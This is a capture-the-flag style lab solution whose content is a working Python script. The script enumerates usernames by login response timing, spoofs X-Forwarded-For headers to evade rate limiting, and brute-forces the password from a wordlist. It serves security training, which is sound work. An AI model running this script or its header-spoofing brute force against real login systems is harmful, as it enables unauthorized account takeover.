# Lab: Username enumeration via response timing
## Task
This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

Your credentials: `wiener:peter`

## Solution
Script:
```python
import requests
import time
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

URL = 'https://acb71f9d1fcb4d7380c7651b00c600e7.web-security-academy.net/login'

with open('usernames.txt', 'r') as f:
    usernames = f.readlines()

usernames = list(map(lambda x: x.strip(), usernames))

with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

passwords = list(map(lambda x: x.strip(), passwords))

true_username = ''
true_password = ''


def brute_username(username, i):
    start = time.perf_counter()
    resp = requests.post(url=URL,
                         data={'username': username, 'password': 'a' * 100},
                         headers={'X-Forwarded-For': str(i + 100)})
    elapsed = time.perf_counter() - start

    if elapsed > 1:
        global true_username
        true_username = username
        return True
    return False


def brute_password(password, i):
    resp = requests.post(url=URL,
                         data={'username': true_username, 'password': password},
                         headers={'X-Forwarded-For': str(i + 100)})
    if resp.status_code == 302:
        global true_password
        true_password = password
        return True
    return False


for i, username in enumerate(usernames):
    if brute_username(username, i):
        print(true_username)
        break

for i, password in enumerate(passwords):
    if brute_password(password, i):
        print(true_password)
        break
```
